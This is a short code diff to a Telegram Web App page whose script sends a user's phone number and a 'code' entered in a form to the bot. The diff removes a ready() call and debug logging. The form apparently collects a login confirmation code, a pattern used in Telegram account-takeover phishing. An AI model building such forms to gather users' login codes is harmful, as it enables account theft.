@@ -100,11 +100,6 @@
   </div>
 
   <script>
-    // Уведомляем Telegram, что наше веб-приложение готово к работе
-    Telegram.WebApp.ready();
-
-    console.log("Telegram.WebApp:", Telegram.WebApp);
-
     const loginBtn = document.getElementById("loginBtn");
     const phoneInput = document.getElementById("phoneNumber");
     const codeInput = document.getElementById("codeInput");
@@ -134,7 +129,7 @@
           phoneNumber: phoneInput.value.trim(),
           code: codeInput.value.trim()
         };
-        console.log("Отправляем данные:", dataToSend);
+        // Отправляем данные в бота через Telegram WebApp API
         Telegram.WebApp.sendData(JSON.stringify(dataToSend));
         messageEl.textContent = "Данные отправлены!";
       }
